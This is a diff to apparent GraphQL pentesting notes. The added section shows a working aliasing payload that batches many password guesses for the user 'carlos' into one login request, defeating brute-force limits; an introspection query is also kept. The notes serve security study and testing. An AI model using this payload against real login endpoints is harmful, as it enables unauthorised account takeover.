@@ -1,4 +1,4 @@
-# GraphQL Notes
+# GraphQL
 
 ## GraphQL Endpoints
 
@@ -15,6 +15,55 @@ GraphQL implementation doesn’t require or enforce, any kind of authentication.
 ## GraphQL Introspection
 
 query {\n  __schema {\n    types {\n      name\n      fields {\n        name\n      }\n    }\n  }\n}
+
+## Bypass Bruteforce Protections with "Aliasing"
+
+A login form like this:  
+
+```graphql
+{
+    "query":"
+        mutation login($input: LoginInput!) {
+            login(input: $input) {
+                token
+                success
+            }
+        }",
+    "operationName":"login",
+    "variables":{
+        "input":{
+            "username":"carlos",
+            "password":"test"
+        }
+    }
+}
+```
+
+becomes:  
+
+```graphql
+{
+    "query": "
+    mutation {
+        bruteforce0:login(input:{password: \"123456\", username: \"carlos\"}) {
+        token
+        success
+    },
+    bruteforce1:login(input:{password: \"password\", username: \"carlos\"}) {
+        token
+        success
+    },
+    bruteforce2:login(input:{password: \"12345678\", username: \"carlos\"}) {
+        token
+        success
+    }
+    }"
+}
+```
+
+Remove the operation name and variables.  
+Also remove the `login($input: LoginInput!)` section beginning the mutation.  
+Add an alias to the beginning of each subrequest - these can be used to correlate successful requests.  
 
 ## Tools
 
